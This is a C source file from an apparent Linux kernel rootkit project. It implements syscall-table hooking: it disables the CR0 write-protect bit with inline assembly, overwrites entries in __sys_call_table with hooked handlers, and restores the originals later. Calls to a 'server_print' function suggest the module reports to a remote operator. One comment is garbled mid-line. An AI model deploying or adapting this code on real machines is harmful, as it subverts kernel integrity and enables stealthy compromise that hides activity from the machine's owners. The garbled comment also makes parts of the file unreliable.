/*
file for the hooking syscalls via the syscall table
*/

#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/unistd.h> //contains syscall names to numbers
#include <linux/version.h> //contains versions  e.g. LINUX_VERSION_CODE KERNEL_VERSION
#include <asm/paravirt.h> //contains functions for read_cr0()
#include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported



typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); //syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls


struct hook_t { //hook data type for the hooking functions
	int syscall_number; //syscall number of syscall
	ptregs_t orig_syscall; //adress of the original syscall
	ptregs_t hooked_syscall; //adress of the original syscall
};

//core hooking functions
static ptregs_t store(int syscall); //stores syscall in hook_t
static int install_hook(struct hook_t *hook); //overwrites sycall table and changes hook to have origional syscall
static int remove_hook(struct hook_t *hook); //overwrites syscall table with origional syscall
static int write_cr0_forced(unsigned long val); //overwrites the cr0
static int set_memory_protection(bool val); //edits memory protection


	/*====================*\
		core functions
	\*====================*/

static ptregs_t store(int syscall){//stores the adress of the origional functions
	ptregs_t orig_syscall = (ptregs_t) __sys_call_table[syscall]; //looks up the syscall in the table and stores in orig_syscall
	return orig_syscall; //returns syscall
}

static int write_cr0_forced(unsigned long val){ //rewrites the cr0 value in the cpu
	//code from here- https://medium.com/@hadfiabdelmoumene/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
	unsigned long __force_order;
	
	//nasm code to rewrite cr0
	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
	//to prevent reads from being recorded with
	//respect to writes, use dummy memory operand
	//"+m"(__force_order)
	return 0; //returns 0 for no error
}
//edits write protection
static int set_memory_protection(bool val){ //sets memory protection to on or off
	if (val){ //turn memory protection on
		//bitwise OR copies bit to result if it is in either operands
		return write_cr0_forced(read_cr0() | (0x10000)); //returns code from write_cr0_forced
	}
	else{
		//bitwise AND copies bitsto result if it is in both operands
		//unary reverse (~) reverses bits so 0x10000 becomes 0x01111removal\n");
		return write_cr0_forced(read_cr0() & (~ 0x10000));  //returns code from write_cr0_forced
	}
}

static int install_hook(struct hook_t *hook){//function that hooks syscall
	hook->orig_syscall=store(hook->syscall_number); //stores the original syscall
	if (!hook->orig_syscall){ //if unable to get original syscall
		return -1; //returns -1 for error
	};
	if (set_memory_protection(false)){ //disables memory protection in cr0- if true memory cannot be disabled
		server_print("\033[1;31;40m[!]\033[0m unable to disbale memory protection\n"); //prints message on server
		return -1;
	}; //disables memory protection in cr0
	
	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->hooked_syscall; //rewrites the adress of the syscall to hooked function
	
	if (set_memory_protection(true)){  //enables memory protection in cr0- if true memory cannot be reenabled
		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
		return -1; //returns -1 for error
	};
	return 0; //returns 0 for no error
}
//sets the sys_call_table back to normal
static int remove_hook(struct hook_t *hook){ //removes a hook
	if (!hook->orig_syscall){ //if unable to get original syscall
		server_print("\033[1;31;40m[!]\033[0m unable to get origional syscall\n"); //prints message on server
		return -1; //returns -1 for error
	};
	if (set_memory_protection(false)){//disables memory protection in cr0- if true memory cannot be disabled
		server_print("\033[1;31;40m[!]\033[0m unable to disable memory protection\n"); //prints message on server
		return -1; //returns -1 for error
	};
	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->orig_syscall;
	if (set_memory_protection(true)){ //enables memory protection in cr0- if true memory cannot be reenabled
		server_print("\033[1;31;40m[!]\033[0m unable to re-enable memory protection\n"); //prints message on server
		return -1; //returns -1 for error
	};
	return 0; //returns 0 for no error
}
